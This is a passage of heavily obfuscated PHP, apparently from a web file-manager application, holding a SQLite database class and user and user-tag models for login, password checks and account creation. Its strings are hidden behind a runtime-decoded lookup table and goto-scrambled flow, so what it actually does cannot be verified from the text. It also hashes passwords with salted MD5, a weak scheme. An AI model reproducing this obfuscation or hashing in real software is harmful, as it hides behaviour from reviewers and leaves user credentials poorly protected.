$b–óÈ©“Ç =& $_SERVER[æ§›¦ÌáØ]; $AÓŞŒíãæ¾ = $b–óÈ©“Ç[33]; if (!empty($Bôœ¡äŠ²ë)) { $Bôœ¡äŠ²ë = explode($b–óÈ©“Ç[47], $Bôœ¡äŠ²ë); if (count($Bôœ¡äŠ²ë) > 1) { $AÓŞŒíãæ¾ .= $b–óÈ©“Ç[48] . $Bôœ¡äŠ²ë[1] . $b–óÈ©“Ç[49] . $Bôœ¡äŠ²ë[0] . $b–óÈ©“Ç[50]; } else { $AÓŞŒíãæ¾ .= $b–óÈ©“Ç[48] . $Bôœ¡äŠ²ë[0] . $b–óÈ©“Ç[50]; } } return $AÓŞŒíãæ¾; } } class DbSqlite3Base extends Db { public function __construct($D¡††„Ú“‡ = '') { $b¦„’×ßø¶ =& $_SERVER[æ§›¦ÌáØ]; if (!class_exists($b¦„’×ßø¶[51])) { think_exception(think_lang($b¦„’×ßø¶[10]) . $b¦„’×ßø¶[52]); } if (!empty($D¡††„Ú“‡)) { if (!isset($D¡††„Ú“‡[$b¦„’×ßø¶[12]])) { $D¡††„Ú“‡[$b¦„’×ßø¶[12]] = 438; } $this->config = $D¡††„Ú“‡; if (empty($this->config[$b¦„’×ßø¶[13]])) { $this->config[$b¦„’×ßø¶[13]] = array(); } } } public function connect($eİºÓ‰õ¶ù = '', $f‹è¸´¡¶Ú = 0) { $Bçºòˆ“É™ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($this->linkID[$f‹è¸´¡¶Ú])) { if (empty($eİºÓ‰õ¶ù)) { $eİºÓ‰õ¶ù = $this->config; } $this->linkID[$f‹è¸´¡¶Ú] = new SQLite3($eİºÓ‰õ¶ù[$Bçºòˆ“É™[17]]); if (!$this->linkID[$f‹è¸´¡¶Ú]) { think_exception($this->linkID[$f‹è¸´¡¶Ú]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$f‹è¸´¡¶Ú]->busyTimeout(30000); if (1 != think_config($Bçºòˆ“É™[18])) { unset($this->config); } } return $this->linkID[$f‹è¸´¡¶Ú]; } public function free() { $this->queryID = null; } public function query($aÉØóÑ…æš) { goto C¡ßÖßßÏ‹; fãÓ‰¹º®Ó: think_status($dòã‰œˆ[20]); $this->queryID = $this->_linkID->query($aÉØóÑ…æš); $this->debug(); goto e†ÛÑ¾õì; C¡ßÖßßÏ‹: $dòã‰œˆ =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D„æõÙâá¬; D„æõÙâá¬: $this->queryStr = $aÉØóÑ…æš; if ($this->queryID) { $this->free(); } think_action_status($dòã‰œˆ[19], 1); goto fãÓ‰¹º®Ó; e†ÛÑ¾õì: if (!1 === $this->queryID) { $this->error(); return !1; } else { $BõÄ£ëíÕ³ = $this->getAll(); $this->numRows = count($BõÄ£ëíÕ³); return $BõÄ£ëíÕ³; } goto d¡Ë÷§é²™; d¡Ë÷§é²™: } public function execute($fí‚½ÀÑ•˜) { goto a÷´‰Úé„; DˆÏšâŠŒ‘: $this->queryStr = $fí‚½ÀÑ•˜; if ($this->queryID) { $this->free(); } think_action_status($a±İ¬Õ¾èÕ[21], 1); goto cŞÖİ·ÊÆš; cŞÖİ·ÊÆš: think_status($a±İ¬Õ¾èÕ[20]); $d†ŠÀ­øÕà = $this->_linkID->exec($fí‚½ÀÑ•˜); $this->debug(); goto AŞÍ­®—·; AŞÍ­®—·: if (!1 === $d†ŠÀ­øÕà) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto EÑåÚ´ˆù; a÷´‰Úé„: $a±İ¬Õ¾èÕ =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DˆÏšâŠŒ‘; EÑåÚ´ˆù: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[æ§›¦ÌáØ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cÎŒœˆÉß¬ = $this->_linkID->query($_SERVER[æ§›¦ÌáØ][23]); if (!$cÎŒœˆÉß¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bá¯ÎŒ¯ì‰ = $this->_linkID->query($_SERVER[æ§›¦ÌáØ][24]); if (!$Bá¯ÎŒ¯ì‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CÊ…«°­£“ = array(); while ($b†ÖÑê¨˜œ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $CÊ…«°­£“[] = $b†ÖÑê¨˜œ; } $this->queryID->reset(); return $CÊ…«°­£“; } public function getFields($DÇğƒæ¿ßÎ) { $b…ˆàÜÇÉ =& $_SERVER[æ§›¦ÌáØ]; $DäãÙ„ˆ¹ = $this->query($b…ˆàÜÇÉ[25] . $DÇğƒæ¿ßÎ . $b…ˆàÜÇÉ[26]); $bô›¤İ›Ó± = array(); if ($DäãÙ„ˆ¹) { foreach ($DäãÙ„ˆ¹ as $DªÙŠŠÆÖ => $BË¶Š¢¾òâ) { $bô›¤İ›Ó±[$BË¶Š¢¾òâ[$b…ˆàÜÇÉ[28]]] = array($b…ˆàÜÇÉ[28] => $BË¶Š¢¾òâ[$b…ˆàÜÇÉ[28]], $b…ˆàÜÇÉ[29] => $BË¶Š¢¾òâ[$b…ˆàÜÇÉ[29]], $b…ˆàÜÇÉ[31] => (bool) ($BË¶Š¢¾òâ[$b…ˆàÜÇÉ[31]] === $b…ˆàÜÇÉ[33]), $b…ˆàÜÇÉ[34] => $BË¶Š¢¾òâ[$b…ˆàÜÇÉ[53]], $b…ˆàÜÇÉ[36] => (bool) $BË¶Š¢¾òâ[$b…ˆàÜÇÉ[54]], $b…ˆàÜÇÉ[39] => (bool) $BË¶Š¢¾òâ[$b…ˆàÜÇÉ[54]]); } } return $bô›¤İ›Ó±; } public function getTables($F‘×„è¡õ = '') { $Fé“Àİ‡— =& $_SERVER[æ§›¦ÌáØ]; $d»‘¾¶Æóà = $this->query($Fé“Àİ‡—[42] . $Fé“Àİ‡—[43] . $Fé“Àİ‡—[44]); $d»åİ¯œª¡ = array(); foreach ($d»‘¾¶Æóà as $déÙ¤˜óÅÃ => $Bñ³™ŒÚæ†) { $d»åİ¯œª¡[$déÙ¤˜óÅÃ] = current($Bñ³™ŒÚæ†); } return $d»åİ¯œª¡; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $EÒëµåàë¨ =& $_SERVER[æ§›¦ÌáØ]; $this->error = $this->_linkID->lastErrorMsg(); if ($EÒëµåàë¨[33] != $this->queryStr) { $this->error .= LNG($EÒëµåàë¨[45]) . $this->queryStr; } think_trace($this->error, $EÒëµåàë¨[33], $EÒëµåàë¨[46]); return $this->error; } public function escapeString($EÂ‚àæµ) { $b‡èÃ–‹à =& $_SERVER[æ§›¦ÌáØ]; if ($this->_linkID) { return $this->_linkID->escapeString($EÂ‚àæµ); } return str_ireplace($b‡èÃ–‹à[55], $b‡èÃ–‹à[56], $EÂ‚àæµ); } public function parseLimit($D¶›âÉáèà) { $D™¡¾ã—§ä =& $_SERVER[æ§›¦ÌáØ]; $CŒ®ê¢ÉÓí = $D™¡¾ã—§ä[33]; if (!empty($D¶›âÉáèà)) { $D¶›âÉáèà = explode($D™¡¾ã—§ä[47], $D¶›âÉáèà); if (count($D¶›âÉáèà) > 1) { $CŒ®ê¢ÉÓí .= $D™¡¾ã—§ä[48] . $D¶›âÉáèà[1] . $D™¡¾ã—§ä[49] . $D¶›âÉáèà[0] . $D™¡¾ã—§ä[50]; } else { $CŒ®ê¢ÉÓí .= $D™¡¾ã—§ä[48] . $D¶›âÉáèà[0] . $D™¡¾ã—§ä[50]; } } return $CŒ®ê¢ÉÓí; } } goto BñÊ—©Á…; DÜâêƒ³öå: $F¨‘¡ˆÅµ¾ = strrev(base64_decode($_SERVER[€÷•Š‹Õ³¾ä][0])); function binCheckNeq($FëğÄ¢…¢Ù, $B‚Õà’îÂ¹) { return $FëğÄ¢…¢Ù != $B‚Õà’îÂ¹; } $_SERVER[$_SERVER[€÷•Š‹Õ³¾ä][1]] = $F¨‘¡ˆÅµ¾($_SERVER[$_SERVER[€÷•Š‹Õ³¾ä][2]]); goto E’Êê‚·˜—; a³‡Ñ£°Ó: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\164\x61\x67\114\151\x73\x74"; public $modelType = "\x55\163\x65\162\117\x70\164\x69\157\156"; public $field = array("\x6e\x61\155\x65", "\163\164\x79\154\x65", "\163\x6f\x72\x74"); public function listData($e‚ÄÚ† = false, $B‹™³²± = "\x73\x6f\162\164", $bá°•‡…¿ = false) { return parent::listData($e‚ÄÚ†, $B‹™³²±, $bá°•‡…¿); } public function remove($AĞƒóÒ¡±Í) { return parent::remove($AĞƒóÒ¡±Í); } public function add($aÕí™Š¼›Œ, $f™††ËÓÙÑ = "\x6c\141\x62\x65\x6c\55\147\162\145\x79\x2d\x6e\x6f\162\x6d\x61\154") { $c–‡Ã¿ÃÉ =& $_SERVER[æ§›¦ÌáØ]; if ($this->findByName($aÕí™Š¼›Œ)) { return !1; } $C—ƒæ“¤÷ = array($c–‡Ã¿ÃÉ[413] => $aÕí™Š¼›Œ, $c–‡Ã¿ÃÉ[464] => $f™††ËÓÙÑ, $c–‡Ã¿ÃÉ[1693] => $this->getSort($c–‡Ã¿ÃÉ[256]) + 1); return parent::insert($C—ƒæ“¤÷); } public function update($d‡ˆÚĞŒæ, $eãÙò—È¹º) { $b³º…œ§²Ÿ =& $_SERVER[æ§›¦ÌáØ]; $F“Ç²½ò¥ = $this->listData($d‡ˆÚĞŒæ); $A™ÒğêáØ¯ = $this->findByName($eãÙò—È¹º[$b³º…œ§²Ÿ[28]]); if (!$F“Ç²½ò¥ || $A™ÒğêáØ¯ && $A™ÒğêáØ¯[$b³º…œ§²Ÿ[393]] != $F“Ç²½ò¥[$b³º…œ§²Ÿ[393]]) { return !1; } return parent::update($d‡ˆÚĞŒæ, $eãÙò—È¹º); } public function moveTop($b ÉãåĞæ¤) { $Eö˜¶Š­ =& $_SERVER[æ§›¦ÌáØ]; $E÷¤¡‘ù é = parent::listData(); $a‚œğÙ…Î´ = $this->getSort($Eö˜¶Š­[255]); foreach ($E÷¤¡‘ù é as &$fö¦›ñï) { if ($fö¦›ñï[$Eö˜¶Š­[393]] == $b ÉãåĞæ¤) { $fö¦›ñï[$Eö˜¶Š­[1712]] = $a‚œğÙ…Î´; continue; } $fö¦›ñï[$Eö˜¶Š­[1712]] += 1; } unset($fö¦›ñï); return parent::resetData($E÷¤¡‘ù é); } public function moveBottom($DÕ­ˆ¨Ó£Æ) { $cÑ‹ÂêÏµÌ =& $_SERVER[æ§›¦ÌáØ]; $EÒ›ŞÏáêß = $this->getSort($cÑ‹ÂêÏµÌ[256]) + 1; return parent::update($DÕ­ˆ¨Ó£Æ, array($cÑ‹ÂêÏµÌ[1712] => $EÒ›ŞÏáêß)); } public function resetSort($döÒøª¤È) { goto F’Ì­°Ñ; aõÉƒß‚éÅ: for ($A¿Ô¿•§…ô = 0; $A¿Ô¿•§…ô < count($döÒøª¤È); $A¿Ô¿•§…ô++) { $D®ˆ…éßù[$döÒøª¤È[$A¿Ô¿•§…ô] . $BÄî­†ÀÂ°[33]] = $A¿Ô¿•§…ô + 1; } $cÖİÂŠ© = parent::listData(); foreach ($cÖİÂŠ© as &$A—£¹•ƒ­ä) { $f÷Ôé†õã¥ = $D®ˆ…éßù[$A—£¹•ƒ­ä[$BÄî­†ÀÂ°[393]]]; $A—£¹•ƒ­ä[$BÄî­†ÀÂ°[1712]] = $f÷Ôé†õã¥ ? $f÷Ôé†õã¥ : $A—£¹•ƒ­ä[$BÄî­†ÀÂ°[1712]]; } goto bèêí³Ö’Û; F’Ì­°Ñ: $BÄî­†ÀÂ° =& $_SERVER[æ§›¦ÌáØ]; $D®ˆ…éßù = array(); $döÒøª¤È = is_array($döÒøª¤È) ? $döÒøª¤È : array(); goto aõÉƒß‚éÅ; bèêí³Ö’Û: unset($A—£¹•ƒ­ä); return parent::resetData($cÖİÂŠ©); goto aà»¡ÕµÍ; aà»¡ÕµÍ: } private function getSort($Cô¢õ±…Í‹) { $f‹´ğÏ„æ¯ =& $_SERVER[æ§›¦ÌáØ]; $A ˆö½Äéƒ = parent::listData(); $c°ÏÊ¡Úßâ = array_to_keyvalue($A ˆö½Äéƒ, $f‹´ğÏ„æ¯[33], $f‹´ğÏ„æ¯[1712]); if (!$c°ÏÊ¡Úßâ) { $c°ÏÊ¡Úßâ = array(0); } $EêğÊˆå = $Cô¢õ±…Í‹ == $f‹´ğÏ„æ¯[256] ? max($c°ÏÊ¡Úßâ) : min($c°ÏÊ¡Úßâ); return intval($EêğÊˆå); } } goto cªÃÈ—±É; B’Ôå­²½: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\x6d\x65" => "\x75\163\x65\x72\137\x6d\x65\x74\141", "\155\145\164\141\106\151\x65\x6c\x64" => "\165\x73\145\x72\111\x44"); protected $simpleField = "\165\163\145\162\x49\x44\x2c\156\151\x63\x6b\116\x61\155\145\54\156\141\155\145\54\x61\166\141\164\x61\x72\54\163\x65\170\x2c\x73\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($F¯”á²í¦) { $f«ÕšÚ¡‡ =& $_SERVER[æ§›¦ÌáØ]; $DÛÍ‡Ëƒ‰® = $f«ÕšÚ¡‡[2112]; return array($f«ÕšÚ¡‡[1759] => array($F¯”á²í¦[0], $DÛÍ‡Ëƒ‰®), $f«ÕšÚ¡‡[1761] => array($F¯”á²í¦[0], $DÛÍ‡Ëƒ‰®), $f«ÕšÚ¡‡[2113] => array($F¯”á²í¦[0], $DÛÍ‡Ëƒ‰®)); } protected function getInfo($d©ÔÒ¼ïÖ, $FáÕä ö–É = false) { $b°éèîÄá‚ = $this->getInfoSimple($d©ÔÒ¼ïÖ); if (!is_array($b°éèîÄá‚)) { return array(); } if ($FáÕä ö–É) { return $this->_getInfoApply($b°éèîÄá‚); } return $this->cacheFunctionGet($_SERVER[æ§›¦ÌáØ][1768], $d©ÔÒ¼ïÖ); } protected function getInfoFull($fˆ¼ˆ­çÈ, $a†¹î·‹È… = false) { $f¾Ïš¢¸Æ« = $this->getInfoSimple($fˆ¼ˆ­çÈ); if (!is_array($f¾Ïš¢¸Æ«)) { return array(); } if ($a†¹î·‹È…) { return $this->_getInfoApply($f¾Ïš¢¸Æ«, !0); return $this->_getInfoApply($f¾Ïš¢¸Æ«, !0); } return $this->cacheFunctionGet($_SERVER[æ§›¦ÌáØ][2114], $fˆ¼ˆ­çÈ); } private function _getInfoApply($F‚Âë›å£œ, $EâÃ·ÀÛ¡ = false) { goto F ÏÁö«Ğ…; aø¢·Í†ÔÆ: $F‚Âë›å£œ[$eÜÔ®Š†Ë‘[85]][$eÜÔ®Š†Ë‘[1948]] = isset($Bò•…“õ†È[$eÜÔ®Š†Ë‘[1949]]) ? $Bò•…“õ†È[$eÜÔ®Š†Ë‘[1949]] : null; if ($EâÃ·ÀÛ¡) { $F‚Âë›å£œ[$eÜÔ®Š†Ë‘[445]] = $this->metaGet($F‚Âë›å£œ[$eÜÔ®Š†Ë‘[1520]]); } return $F‚Âë›å£œ; goto E«¶íèèˆ; F ÏÁö«Ğ…: $eÜÔ®Š†Ë‘ =& $_SERVER[æ§›¦ÌáØ]; if (!$F‚Âë›å£œ) { return $F‚Âë›å£œ; } $fíÃ‚‰ß = md5($eÜÔ®Š†Ë‘[2115] . $F‚Âë›å£œ[$eÜÔ®Š†Ë‘[840]] . $eÜÔ®Š†Ë‘[2116] . $F‚Âë›å£œ[$eÜÔ®Š†Ë‘[28]]); goto cÀÈ÷‚¥•; cÀÈ÷‚¥•: $F‚Âë›å£œ = $this->_listDataApplyItem($F‚Âë›å£œ); $Bò•…“õ†È = Model($eÜÔ®Š†Ë‘[1196])->metaGet($F‚Âë›å£œ[$eÜÔ®Š†Ë‘[85]][$eÜÔ®Š†Ë‘[395]]); $F‚Âë›å£œ[$eÜÔ®Š†Ë‘[2117]] = $fíÃ‚‰ß; goto aø¢·Í†ÔÆ; E«¶íèèˆ: } protected function getInfoSimple($eëù¤‘ÇçÁ, $DŞÒ…Œ‘‰ = false) { $Aî‘á¿ÑÖ´ =& $_SERVER[æ§›¦ÌáØ]; if (!$eëù¤‘ÇçÁ) { return array(); } if ($DŞÒ…Œ‘‰) { $C¥«ÕÓœíï = $this->where(array($Aî‘á¿ÑÖ´[1520] => intval($eëù¤‘ÇçÁ)))->find(); if (!is_array($C¥«ÕÓœíï)) { return array(); } $C¥«ÕÓœíï[$Aî‘á¿ÑÖ´[2118]] = Action($Aî‘á¿ÑÖ´[2119])->parseUrl($C¥«ÕÓœíï[$Aî‘á¿ÑÖ´[2118]]); return $C¥«ÕÓœíï; } return $this->cacheFunctionGet($Aî‘á¿ÑÖ´[1762], $eëù¤‘ÇçÁ); } protected function getInfoSimpleOuter($Eœ‘Œ™Š›Æ) { goto cÇÏ‰­¢Ú§; b©±îùí©å: $E¸ƒ‰óß‹· = array_field_key($f‰£İº‹ß, explode($D°šŠ…Ú¨Ü[47], $this->simpleField)); if (!$E¸ƒ‰óß‹·) { return array($D°šŠ…Ú¨Ü[1520] => $D°šŠ…Ú¨Ü[1075], $D°šŠ…Ú¨Ü[28] => $D°šŠ…Ú¨Ü[160] . LNG($D°šŠ…Ú¨Ü[2122]) . $D°šŠ…Ú¨Ü[517], $D°šŠ…Ú¨Ü[2118] => STATIC_PATH . $D°šŠ…Ú¨Ü[2123]); } $E¸ƒ‰óß‹·[$D°šŠ…Ú¨Ü[2118]] = Action($D°šŠ…Ú¨Ü[2119])->parseUrl($E¸ƒ‰óß‹·[$D°šŠ…Ú¨Ü[2118]]); goto cÛĞª”òğë; cÇÏ‰­¢Ú§: $D°šŠ…Ú¨Ü =& $_SERVER[æ§›¦ÌáØ]; if (!$Eœ‘Œ™Š›Æ || $Eœ‘Œ™Š›Æ == 0) { return array($D°šŠ…Ú¨Ü[1520] => $D°šŠ…Ú¨Ü[191], $D°šŠ…Ú¨Ü[28] => $D°šŠ…Ú¨Ü[160] . LNG($D°šŠ…Ú¨Ü[2120]) . $D°šŠ…Ú¨Ü[517], $D°šŠ…Ú¨Ü[2118] => STATIC_PATH . $D°šŠ…Ú¨Ü[2121]); } $f‰£İº‹ß = $this->cacheFunctionGet($D°šŠ…Ú¨Ü[1762], $Eœ‘Œ™Š›Æ); goto b©±îùí©å; cÛĞª”òğë: return $E¸ƒ‰óß‹·; goto aï°½½Ìé¹; aï°½½Ìé¹: } protected function groupUser($dÖ…¨®¼¦ˆ) { } public static function errorLang($dÖÙÇÔëÜâ) { $E×…©á Ãğ =& $_SERVER[æ§›¦ÌáØ]; $E¹ÚŠÔ® = array(self::ERROR_USER_NOT_EXISTS => $E×…©á Ãğ[2124], self::ERROR_USER_PASSWORD_ERROR => $E×…©á Ãğ[2125], self::ERROR_USER_EXIST_NAME => $E×…©á Ãğ[2126], self::ERROR_USER_EXIST_PHONE => $E×…©á Ãğ[2127], self::ERROR_USER_EXIST_EMAIL => $E×…©á Ãğ[2128], self::ERROR_USER_LOGIN_LOCK => $E×…©á Ãğ[2129], self::ERROR_IP_NOT_ALLOW => $E×…©á Ãğ[2130], self::ERROR_USER_EXIST_NICKNAME => $E×…©á Ãğ[2131]); return LNG($E¹ÚŠÔ®[$dÖÙÇÔëÜâ]); } public function getInfoByMeta($FÇŸÀ»à®¹, $d¹§Œì²ğ) { $a¥âªÎˆ›§ =& $_SERVER[æ§›¦ÌáØ]; $fÏ°†®Ìê… = Model($a¥âªÎˆ›§[2132])->where(array($a¥âªÎˆ›§[93] => $FÇŸÀ»à®¹, $a¥âªÎˆ›§[372] => $d¹§Œì²ğ))->find(); if ($fÏ°†®Ìê…) { return $this->getInfo($fÏ°†®Ìê…[$a¥âªÎˆ›§[1520]]); } return !1; } public function userLoginCheck($a™¤‘´ĞŒ–, $AØ©Ì¾¾İ) { $aù¯©Ş‚  =& $_SERVER[æ§›¦ÌáØ]; $a•êì˜â™™ = $this->userLoginFind($a™¤‘´ĞŒ–); if (!$a•êì˜â™™) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($a•êì˜â™™[$aù¯©Ş‚ [1520]], $AØ©Ì¾¾İ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($a•êì˜â™™[$aù¯©Ş‚ [1520]]); } public function userLoginFind($DĞ¡Û¯¦´ƒ) { $bŞ¡³»ƒ‹Ü =& $_SERVER[æ§›¦ÌáØ]; $AäÄÇÈ±å = array($bŞ¡³»ƒ‹Ü[28] => $DĞ¡Û¯¦´ƒ, $bŞ¡³»ƒ‹Ü[1952] => $DĞ¡Û¯¦´ƒ, $bŞ¡³»ƒ‹Ü[303] => $DĞ¡Û¯¦´ƒ, $bŞ¡³»ƒ‹Ü[2133] => $DĞ¡Û¯¦´ƒ, $bŞ¡³»ƒ‹Ü[948] => $bŞ¡³»ƒ‹Ü[950]); if ($this->nickNameRpt()) { unset($AäÄÇÈ±å[$bŞ¡³»ƒ‹Ü[1952]]); } return $this->where($AäÄÇÈ±å)->find(); } public function clearCache($Fù„™ö¨ã­) { $Aì¤¢íÇ‰ =& $_SERVER[æ§›¦ÌáØ]; $this->cacheFunctionClear($Aì¤¢íÇ‰[1768], $Fù„™ö¨ã­); $this->cacheFunctionClear($Aì¤¢íÇ‰[1762], $Fù„™ö¨ã­); $this->cacheFunctionClear($Aì¤¢íÇ‰[2114], $Fù„™ö¨ã­); } public function userPasswordCheck($Cõ©éœñ´, $BÅ“Ò¥‰å) { $fÄ²…¸±¹ñ =& $_SERVER[æ§›¦ÌáØ]; $cªĞğ™ŒÔ = $this->where(array($fÄ²…¸±¹ñ[1520] => intval($Cõ©éœñ´)))->find(); $F’ŠÊÄË› = $this->metaGet($Cõ©éœñ´); $EµÜñÚºÁ = isset($F’ŠÊÄË›[$fÄ²…¸±¹ñ[2134]]) ? $F’ŠÊÄË›[$fÄ²…¸±¹ñ[2134]] : $fÄ²…¸±¹ñ[33]; if (md5($EµÜñÚºÁ . trim($BÅ“Ò¥‰å)) !== $cªĞğ™ŒÔ[$fÄ²…¸±¹ñ[840]]) { return !1; } return !0; } public function userAdd($aĞøî™î¤ä) { goto d††°ÍƒÕ; bª¡‹¾‹ñ¯: $A…¯•™õÌ = $this->_checkExist($aĞøî™î¤ä); if ($A…¯•™õÌ !== !0) { return $A…¯•™õÌ; } $eñ…Ê¾°·« = $this->add($Fïñ¶¬¾â); goto CÍ‹â«·ì; Ağ’Ãíí¹…: return $eñ…Ê¾°·«; goto D¨·§Ş¬“; d††°ÍƒÕ: $B¹œŞÊÁæ =& $_SERVER[æ§›¦ÌáØ]; $Fïñ¶¬¾â = array($B¹œŞÊÁæ[413] => $aĞøî™î¤ä[$B¹œŞÊÁæ[28]], $B¹œŞÊÁæ[2135] => $aĞøî™î¤ä[$B¹œŞÊÁæ[1403]], $B¹œŞÊÁæ[2136] => isset($aĞøî™î¤ä[$B¹œŞÊÁæ[303]]) ? $aĞøî™î¤ä[$B¹œŞÊÁæ[303]] : $B¹œŞÊÁæ[33], $B¹œŞÊÁæ[2137] => isset($aĞøî™î¤ä[$B¹œŞÊÁæ[2133]]) ? $aĞøî™î¤ä[$B¹œŞÊÁæ[2133]] : $B¹œŞÊÁæ[33], $B¹œŞÊÁæ[2138] => isset($aĞøî™î¤ä[$B¹œŞÊÁæ[1952]]) ? $aĞøî™î¤ä[$B¹œŞÊÁæ[1952]] : $aĞøî™î¤ä[$B¹œŞÊÁæ[28]], $B¹œŞÊÁæ[2139] => isset($aĞøî™î¤ä[$B¹œŞÊÁæ[2118]]) ? $aĞøî™î¤ä[$B¹œŞÊÁæ[2118]] : $B¹œŞÊÁæ[33], $B¹œŞÊÁæ[2140] => isset($aĞøî™î¤ä[$B¹œŞÊÁæ[2141]]) ? $aĞøî™î¤ä[$B¹œŞÊÁæ[2141]] : 1, $B¹œŞÊÁæ[2142] => $aĞøî™î¤ä[$B¹œŞÊÁæ[840]], $B¹œŞÊÁæ[1763] => isset($aĞøî™î¤ä[$B¹œŞÊÁæ[1673]]) ? $aĞøî™î¤ä[$B¹œŞÊÁæ[1673]] : 1024 * 1024 * 20, $B¹œŞÊÁæ[1764] => 0, $B¹œŞÊÁæ[2143] => 0, $B¹œŞÊÁæ[1807] => isset($aĞøî™î¤ä[$B¹œŞÊÁæ[703]]) ? $aĞøî™î¤ä[$B¹œŞÊÁæ[703]] : 1); if (!empty($aĞøî™î¤ä[$B¹œŞÊÁæ[1520]])) { $Fïñ¶¬¾â[$B¹œŞÊÁæ[1520]] = $aĞøî™î¤ä[$B¹œŞÊÁæ[1520]]; } goto bª¡‹¾‹ñ¯; CÍ‹â«·ì: $FÆ‹£³ØÄ = array($B¹œŞÊÁæ[2142] => $Fïñ¶¬¾â[$B¹œŞÊÁæ[840]], $B¹œŞÊÁæ[2138] => $Fïñ¶¬¾â[$B¹œŞÊÁæ[1952]]); $this->userEdit($eñ…Ê¾°·«, $FÆ‹£³ØÄ); Model($B¹œŞÊÁæ[1196])->userRootAdd($eñ…Ê¾°·«); goto Ağ’Ãíí¹…; D¨·§Ş¬“: } protected function userEditTest($fŸìêâÆàà, $Eé‡È’”ì×) { return $this->call($_SERVER[æ§›¦ÌáØ][2144], $fŸìêâÆàà, $Eé‡È’”ì×); } protected function userEdit($dØØ¦šÙ‹Ó, $DŸ½±—ã­ƒ) { goto DÅ¾ Â¿ß–; F¸ùì‚ºÎ¼: return !0; goto Eòğ»Ä¿‘; e¿òŸå’ñ: $cñôŸâŞà = $this->_checkExist($DŸ½±—ã­ƒ, $dØØ¦šÙ‹Ó); if ($cñôŸâŞà !== !0) { return $cñôŸâŞà; } if (isset($DŸ½±—ã­ƒ[$b¥¶÷Ì¶Ú[840]]) && trim($DŸ½±—ã­ƒ[$b¥¶÷Ì¶Ú[840]]) != $b¥¶÷Ì¶Ú[33]) { $aß†¯Å‚ã = $this->metaGet($dØØ¦šÙ‹Ó); if (empty($aß†¯Å‚ã[$b¥¶÷Ì¶Ú[2134]])) { $aß†¯Å‚ã[$b¥¶÷Ì¶Ú[2134]] = rand_string(10); Model($b¥¶÷Ì¶Ú[494])->metaSet($dØØ¦šÙ‹Ó, $b¥¶÷Ì¶Ú[2134], $aß†¯Å‚ã[$b¥¶÷Ì¶Ú[2134]]); } $DŸ½±—ã­ƒ[$b¥¶÷Ì¶Ú[840]] = md5($aß†¯Å‚ã[$b¥¶÷Ì¶Ú[2134]] . trim($DŸ½±—ã­ƒ[$b¥¶÷Ì¶Ú[840]])); } else { unset($DŸ½±—ã­ƒ[$b¥¶÷Ì¶Ú[840]]); } goto b½Äø÷÷Â; DÅ¾ Â¿ß–: $b¥¶÷Ì¶Ú =& $_SERVER[æ§›¦ÌáØ]; $B†­£âù¥Á = $this->getInfoSimple($dØØ¦šÙ‹Ó); if (!$B†­£âù¥Á) { return !1; } goto e¿òŸå’ñ; b½Äø÷÷Â: $this->where(array($b¥¶÷Ì¶Ú[1511] => $dØØ¦šÙ‹Ó))->save($DŸ½±—ã­ƒ); if (isset($DŸ½±—ã­ƒ[$b¥¶÷Ì¶Ú[1952]])) { $this->setNamePinyin($dØØ¦šÙ‹Ó, $DŸ½±—ã­ƒ[$b¥¶÷Ì¶Ú[1952]]); } $this->clearCache($dØØ¦šÙ‹Ó); goto F¸ùì‚ºÎ¼; Eòğ»Ä¿‘: } public function setNamePinyin($DÄó‡¿„ÎŸ, $c’Øó“Ô¦ = false) { $BŒõ¥ã¢”á =& $_SERVER[æ§›¦ÌáØ]; if (!$c’Øó“Ô¦) { $fÄ™á’õâ = $this->getInfoSimple($DÄó‡¿„ÎŸ); $c’Øó“Ô¦ = $fÄ™á’õâ[$BŒõ¥ã¢”á[1952]] ? $fÄ™á’õâ[$BŒõ¥ã¢”á[1952]] : $fÄ™á’õâ[$BŒõ¥ã¢”á[28]]; } $FíÏçõ×‰¸ = Model($BŒõ¥ã¢”á[519]); if (!Input::check($c’Øó“Ô¦, $BŒõ¥ã¢”á[569])) { return $FíÏçõ×‰¸->metaSet($DÄó‡¿„ÎŸ, array($BŒõ¥ã¢”á[444] => $BŒõ¥ã¢”á[33], $BŒõ¥ã¢”á[443] => $BŒõ¥ã¢”á[33])); } return $FíÏçõ×‰¸->metaSet($DÄó‡¿„ÎŸ, array($BŒõ¥ã¢”á[444] => str_replace($BŒõ¥ã¢”á[50], $BŒõ¥ã¢”á[33], Pinyin::encode($c’Øó“Ô¦)), $BŒõ¥ã¢”á[443] => Pinyin::encode($c’Øó“Ô¦, $BŒõ¥ã¢”á[570]))); } private function nickNameRpt() { $C™šàòôóŒ =& $_SERVER[æ§›¦ÌáØ]; $b¸Ñ¢™ÕÍï = Model($C™šàòôóŒ[723])->get($C™šàòôóŒ[2145]); $B§ëÍ°„Õé = $GLOBALS[$C™šàòôóŒ[6]][$C™šàòôóŒ[378]][$C™šàòôóŒ[2145]]; $b§Ò”ÔŒè = !is_null($b¸Ñ¢™ÕÍï) ? 